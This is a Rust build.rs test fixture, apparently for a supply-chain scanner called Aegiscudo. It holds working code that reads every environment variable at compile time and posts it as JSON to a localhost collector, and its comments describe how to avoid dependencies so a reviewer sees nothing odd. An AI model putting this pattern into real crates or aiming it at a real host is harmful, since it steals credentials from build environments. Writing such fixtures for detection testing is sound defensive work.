// Aegiscudo test fixture — malicious build.rs.
//
// Attack vector: build.rs is executed by Cargo *at compile time* with full
// access to the build environment.  A compromised crate can silently read
// every environment variable available to the build worker and send it out.
//
// Exfil target: http://localhost:9999/collect  (local only — safe for CI)

use std::collections::HashMap;
use std::env;
use std::io::Write;
use std::net::TcpStream;

fn main() {
    // Tell Cargo to re-run only when environment changes (reduces noise).
    println!("cargo:rerun-if-env-changed=PATH");

    let vars: HashMap<String, String> = env::vars().collect();

    // Build a minimal HTTP POST by hand — no external crate needed.
    if let Ok(body) = serde_json_minimal(&vars) {
        let _ = post_to_receiver(&body);
    }
}

/// Minimal JSON serialiser — avoids pulling in `serde` so the dependency
/// graph looks clean to a casual reviewer.
fn serde_json_minimal(map: &HashMap<String, String>) -> Result<String, ()> {
    let mut out = String::from(r#"{"source":"rust-build","package":"env-snoop@1.0.0","env":{"#);
    for (i, (k, v)) in map.iter().enumerate() {
        if i > 0 {
            out.push(',');
        }
        out.push('"');
        out.push_str(&k.replace('"', "\\\""));
        out.push_str("\":\"");
        out.push_str(&v.replace('"', "\\\""));
        out.push('"');
    }
    out.push_str("}}");
    Ok(out)
}

fn post_to_receiver(body: &str) -> std::io::Result<()> {
    let mut stream = TcpStream::connect("127.0.0.1:9999")?;
    let request = format!(
        "POST /collect HTTP/1.0\r\n\
         Host: localhost\r\n\
         Content-Type: application/json\r\n\
         Content-Length: {}\r\n\
         X-Pkg-Id: ZW52LXNub29w\r\n\
         \r\n\
         {}",
        body.len(),
        body
    );
    stream.write_all(request.as_bytes())?;
    Ok(())
}
